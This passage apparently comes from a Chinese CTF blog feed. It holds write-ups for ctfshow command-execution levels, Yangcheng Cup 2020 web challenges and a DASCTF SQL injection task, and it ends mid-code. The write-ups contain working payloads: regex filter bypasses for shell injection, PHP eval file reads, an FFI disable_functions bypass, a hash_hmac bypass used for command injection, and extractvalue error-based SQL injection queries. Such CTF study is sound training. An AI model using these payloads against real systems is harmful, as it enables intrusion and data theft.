&#125;</span><br></pre></td></tr></table></figure><p>这里过滤很严格，但是依旧可以绕过，用通配符和bash</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[@-[]是linux下的匹配符，是进行匹配的大写字母</span><br></pre></td></tr></table></figure><p>起一个文件上传的网页，上传文件抓个包，具体知识点看截图</p><img src="/2020/09/22/ctfshowcommand/1.png" class=""><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>解法跟55同</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">"cat "</span>.$c.<span class="string">".php"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>根据提示flag在36.php文件中，无字母数字构造出36</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="comment">#$((~$(()))) -1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(()))))))) 1</span></span><br><span class="line"><span class="comment">#$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span></span><br></pre></td></tr></table></figure><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试，发现命令执行函数基本上都被ban了，这里要寻找其他方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);</span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);</span><br><span class="line">其他师傅的姿势</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);          </span><br><span class="line">readfile(<span class="string">"flag.php"</span>);</span><br></pre></td></tr></table></figure><h3 id="web59-web65"><a href="#web59-web65" class="headerlink" title="web59-web65"></a>web59-web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=highlight_file(<span class="string">"flag.php"</span>);<span class="comment">#通杀</span></span><br><span class="line">c=show_source(<span class="string">"flag.php"</span>);<span class="comment">#通杀</span></span><br><span class="line">下面的payload来自_yu_师傅（感谢）</span><br><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetss($a);<span class="keyword">echo</span> $line;&#125;       <span class="comment">//php7.3版本后 该函数已不再被使用</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fpassthru($a);                                      <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">echo</span> fread($a,<span class="string">"1000"</span>);                                   <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgets($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//过59</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetc($a);<span class="keyword">echo</span> $line;&#125;        <span class="comment">//过60</span></span><br><span class="line">$a=fopen(<span class="string">"flag.php"</span>,<span class="string">"r"</span>);<span class="keyword">while</span> (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;  <span class="comment">//过60</span></span><br><span class="line">单一函数读文件内容：</span><br><span class="line">函数：</span><br><span class="line">file_get_contents()</span><br><span class="line">readfile()</span><br><span class="line">file()</span><br><span class="line">用法：</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"flag.php"</span>);           <span class="comment">//过58</span></span><br><span class="line">readfile(<span class="string">"flag.php"</span>);                         <span class="comment">//过58</span></span><br><span class="line">print_r(file(<span class="string">"flag.php"</span>));                    <span class="comment">//过59</span></span><br><span class="line">通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span><br><span class="line">函数：</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line">用法：</span><br><span class="line">copy(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);             <span class="comment">//过60</span></span><br><span class="line">rename(<span class="string">"flag.php"</span>,<span class="string">"flag.txt"</span>);           <span class="comment">//过60</span></span><br></pre></td></tr></table></figure><h3 id="web66-web70"><a href="#web66-web70" class="headerlink" title="web66-web70"></a>web66-web70</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心代码部分没有改变，变得是文件位置，需要对目录结构进行扫描</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);</span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);</span><br><span class="line"><span class="comment">#由于后面的文件都是txt文件，所以可以直接用include进行包含</span></span><br><span class="line"></span><br><span class="line">c=var_dump(scandir(<span class="string">"/"</span>));highlight_file(<span class="string">"/flag.txt"</span>);          <span class="comment">//过66-67                              </span></span><br><span class="line">c=$a=opendir(<span class="string">"/"</span>); <span class="keyword">while</span> (($file = readdir($a)) !== <span class="keyword">false</span>)&#123;<span class="keyword">echo</span> $file . <span class="string">"&lt;br&gt;"</span>; &#125;;highlight_file(<span class="string">"/flag.txt"</span>);                       <span class="comment">//过66-67</span></span><br></pre></td></tr></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">"/[0-9]|[a-z]/i"</span>,<span class="string">"?"</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的代码做出了小变化</p><p>可以看到这里会把读到的内容放到内存当中，并且会输出进行了正则替换后的内容，还是有方法进行绕过，让程序提前结束退出即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">exit</span>();||c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h3 id="web72-看-yu-师傅的blog"><a href="#web72-看-yu-师傅的blog" class="headerlink" title="web72(看_yu_师傅的blog)"></a>web72(看_yu_师傅的blog)</h3><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><h3 id="web75-web76"><a href="#web75-web76" class="headerlink" title="web75-web76"></a>web75-web76</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">利用mysql load_file读文件   <span class="comment">//过75,76</span></span><br><span class="line">读取目录</span><br><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br><span class="line"></span><br><span class="line">读取文件</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $dbh = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=ctftraining'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">  <span class="keyword">foreach</span>($dbh-&gt;query(<span class="string">'select load_file("/var/www/html/index.php")'</span>) <span class="keyword">as</span> $row) &#123;</span><br><span class="line">      <span class="keyword">echo</span>($row[<span class="number">0</span>]).<span class="string">"|"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $dbh = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">  <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">$FFI读取</span><br><span class="line">c=$ffi = FFI::cdef(<span class="string">"int system(char *command);"</span>, <span class="string">"libc.so.6"</span>);$a=<span class="string">'/readflag &gt; xxx.txt'</span>;$ffi-&gt;system($a);<span class="keyword">exit</span>();   <span class="comment">//访问xxx.txt</span></span><br><span class="line">放一篇文章：https:<span class="comment">//www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2020</title>
      <link href="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/"/>
      <url>/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/</url>
      
        <content type="html"><![CDATA[<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结<a id="more"></a></h3><p>这次比赛，做了俩web，有一道web总感觉差点，一个人打很吃力，没队友交流思路，自己还是能力欠缺了，总归还是有收获的</p><h3 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ul><li>小马</li><li>base64本地转图片</li></ul><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>开题</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/1.png" class=""><p>就是一个apache的配置信息，直接改访问index.php</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/2.png" class=""><p>提示post一个cmd过去，看一下网页源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> <span class="selector-tag">div</span><span class="selector-class">.main</span> &#123; <span class="attribute">margin-left</span>:auto; <span class="attribute">margin-right</span>:auto;  &#125; <span class="selector-tag">body</span> &#123; <span class="attribute">background-color</span>: <span class="number">#FAEBA7</span>; &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">       welcome to YCBCTF</span><br><span class="line">     <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">gw2.jpg</span>  <span class="attr">width</span>=<span class="string">49%</span> <span class="attr">height</span>=<span class="string">60%</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">gw.jpg</span>  <span class="attr">width</span>=<span class="string">49%</span> <span class="attr">height</span>=<span class="string">60%</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'eval post cmd'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>猜测是一个可以连接的shell，直接拿蚁剑连接</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/3.png" class=""><p>连上后找了根目录，没有找到flag，发现在web服务目录下还有一个txt文件，下载到本地，base64解码可以看到jfif猜测是图片，但是解的码不能还原成图片，想到之前做过的题目，在浏览器打开时也是这样的形式，自己本地写一个</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">&lt;&lt;img src="data:image/png;base64,xxxxxxxxxxxxxx" alt=""&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>把txt文件中的内容替换在xxxxxxxx处即可，再本地起一下网页</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/4.png" class=""><p>flag到手</p><h3 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><ul><li>strings命令</li><li><code>hash_hmac</code>绕过</li></ul><h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>开题</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/5.png" class=""><p>查看网页源代码，提示听歌，直接把歌下过来，丢到kali里，用strings命令看一下</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/6.png" class=""><p>可以看到最后有源码，撕下来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'Black-Cat-Sheriff'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'One-ear'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'谁！竟敢踩我一只耳的尾巴！'</span>);</span><br><span class="line">$clandestine = getenv(<span class="string">"clandestine"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'White-cat-monitor'</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'White-cat-monitor'</span>], $clandestine);</span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'One-ear'</span>], $clandestine);</span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">'Black-Cat-Sheriff'</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">''</span>);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_POST[<span class="string">'One-ear'</span>]);</span><br></pre></td></tr></table></figure><p>要想执行后面的exec，就得绕过这个判断</p><p>查找资料，本地调试，发现 <code>hash_hmac()</code>函数传入的第二个参数为数组时会返回NULL，那也就是说加密之后的<code>$clandestine</code>可控了，加上<code>$One-ear</code>和<code>$Black-Cat-Sheriff</code>都可控，那就简单了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$clandestine = hash_hmac(<span class="string">'sha256'</span>, $_GET[<span class="string">'2'</span>], $clandestine);</span><br><span class="line">var_dump($clandestine);</span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_GET[<span class="string">'1'</span>], $clandestine);</span><br><span class="line">var_dump($hh);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地进行加密，再进行传参，这里的<code>nc</code>开始我以为要谈个shell到本地，试了一下不行，后来发现<code>;</code>可以阻断<code>nc</code>命令，后面拼接自己想要使用的命令，这里由于返回结果只有一行，所以用<code>find</code>命令查找flag文件即可，直接给最后的结果图</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/7.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASAugust</title>
      <link href="/2020/09/05/DASAugust/"/>
      <url>/2020/09/05/DASAugust/</url>
      
        <content type="html"><![CDATA[<h2 id="安恒大学"><a href="#安恒大学" class="headerlink" title="安恒大学"></a>安恒大学<a id="more"></a></h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>SQL报错注入</li><li>注入点</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题是一个登录界面</p><img src="/2020/09/05/DASAugust/1.png" class=""><p>可以注册，并且真实发送邮箱激活的邮件，开始没注意这里，后面再说</p><p>激活之后就可以登录了</p><img src="/2020/09/05/DASAugust/2.png" class=""><p>可以看到这个教务系统有很多的功能，比赛那天找了挺久找不到利用的地方， 又没有像是模板注入的点</p><p>赛后看师傅的wp就是在前面的发送邮箱激活的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;pegggg&amp;token&#x3D;6011b0c07969fccb63b51daeaf1a4180</span><br></pre></td></tr></table></figure><p>这里的username就是注入点，之后就是常规的报错注入，先来看一下数据库</p><img src="/2020/09/05/DASAugust/3.png" class=""><p>下面就是看表和列名了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先查表名</span><br><span class="line">1'and extractvalue(0x0a,concat(0x0a,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())))<span class="comment">--+</span></span><br><span class="line"><span class="comment">#XPATH syntax error: ' student,teachers,users'</span></span><br><span class="line"></span><br><span class="line">可以看到有三个表，一个个看</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">')))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span> <span class="keyword">id</span>,username,<span class="keyword">password</span>,ip,<span class="built_in">time</span>,US<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1'</span><span class="keyword">and</span> extractvalue(<span class="number">0x0a</span>,<span class="keyword">concat</span>(<span class="number">0x0a</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'teachers'</span>)))<span class="comment">--+</span></span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="string">' id,f1aaaag'</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='</span>student<span class="string">')))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span> <span class="keyword">id</span>,username,age,sex<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">找到了flag字段，就查teachers那张表就行</span></span><br><span class="line"><span class="string">这里很明显有长度限制，并且要注意，这里有很多假的flag数据，需要逐条查询，用limit</span></span><br><span class="line"><span class="string">1'</span><span class="keyword">and</span> extractvalue(<span class="number">0x0a</span>,<span class="keyword">substr</span>((<span class="keyword">concat</span>(<span class="number">0x0a</span>,(<span class="keyword">select</span> f1aaaag <span class="keyword">from</span>  <span class="number">51</span>zxw.teachers <span class="keyword">limit</span> <span class="number">11</span>,<span class="number">1</span>))),<span class="number">1</span>,<span class="number">40</span>))<span class="comment">--+</span></span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="string">' DASCTF&#123;5af8b8860434db2184a427ee'</span></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,substr((concat(0x0a,(select f1aaaag from  51zxw.teachers limit 11,1))),5,38))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span>af8b8860434db2184a427ee1fe6b845&#125;<span class="string">'</span></span><br></pre></td></tr></table></figure><img src="/2020/09/05/DASAugust/5.png" class=""><img src="/2020/09/05/DASAugust/4.png" class=""><p>把上面的两部分flag去重拼接就可以了</p><p>这里也可以用reverse倒叙输出来拿到后面部分的flag，再进行拼接</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>无字母数字RCE</li><li>数字构造</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题放送源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span 